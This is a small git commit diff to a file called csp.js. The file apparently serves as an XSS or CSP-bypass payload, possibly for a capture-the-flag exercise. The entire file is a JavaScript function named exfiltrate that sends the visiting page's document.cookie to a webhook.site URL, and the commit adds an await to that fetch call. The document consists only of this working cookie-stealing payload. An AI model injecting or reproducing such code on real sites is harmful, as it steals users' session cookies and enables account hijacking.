929c140461c4ff7d7da738b2e45e25b0a0f0ffc4
Vigneswar-A <93377157+Vigneswar-A@users.noreply.github.com>
2025-01-20 17:27:35 +0530

    Update csp.js

--- csp.js
+++ csp.js
@@ -1,4 +1,4 @@
 async function exfiltrate(){
-  fetch('https://webhook.site/97274b59-5b47-484b-a6d6-6908d03fad5e/?cookie='+document.cookie);
+  await fetch('https://webhook.site/97274b59-5b47-484b-a6d6-6908d03fad5e/?cookie='+document.cookie);
 }
 exfiltrate();
